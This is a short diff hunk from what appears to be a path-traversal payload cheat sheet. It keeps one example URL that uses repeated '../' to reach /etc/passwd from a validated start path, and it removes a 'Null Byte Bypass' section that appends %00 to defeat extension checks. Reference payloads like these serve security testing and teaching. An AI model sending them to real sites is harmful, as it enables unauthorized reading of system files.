@@ -53,8 +53,3 @@ Validation of Start Path
 -------------------------
 http://example.com/index.php?page=/validated_path/../../../../../../../etc/passwd
 
-
-Null Byte Bypass
------------------
-http://example.com/index.php?page=/../../../../../../../etc/passwd%00 >> this escape ".png, .jpg..." extensions
-
